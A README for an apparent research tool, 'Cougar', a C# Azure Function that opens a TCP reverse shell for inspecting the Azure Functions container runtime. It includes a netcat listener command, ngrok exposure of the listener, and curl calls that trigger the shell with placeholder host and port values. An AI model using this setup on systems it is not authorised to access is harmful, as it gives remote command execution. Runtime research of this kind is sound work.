# Puma Prey Cougar

Cougar is a C# function that can be deployed to the Azure to establish a TCP reverse shell for the purposes of introspecting the Azure Functions container runtime.

## Installing Prerequisites

* [.NET Core 3.1 SDK](https://dotnet.microsoft.com/download)
* [Terraform](https://learn.hashicorp.com/terraform/getting-started/install.html)

## Deploying the Function

```bash
cd src
dotnet restore
dotnet build
cd ../terraform
terraform init
export TF_VAR_UniqueString=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') # Save this value for future sessions.
terraform plan
terraform apply
```

## Testing in Azure

Set up a TCP listener for your reverse shell, such as with [Netcat](http://netcat.sourceforge.net/):

```bash
nc -l 4444
```

To make your listener accessible from the public internet, consider using a service like [ngrok](https://ngrok.com/):

```bash
ngrok tcp 4444
```

Navigate to your function, supplying your connection details and API key:

```bash
curl "https://cougar$TF_VAR_UniqueString.azurewebsites.net/api/Cougar?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER"
```

Your listener will now act as a reverse shell for the duration of the function invocation.

## Teardown

```bash
terraform destroy
```

## Running Locally

Install [Azure Functions Core Tools](https://docs.microsoft.com/en-us/azure/azure-functions/functions-run-local) and run the following:

```bash
cd src
dotnet restore
dotnet build
func start
```

## Testing Locally

```bash
curl 'http://localhost:7071/api/Cougar?host=YOUR_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER'
```

## Azure Function C# Template

```bash
func init Cougar --csharp --dotnet
func new --template "HTTP trigger" --name GetCougar
```
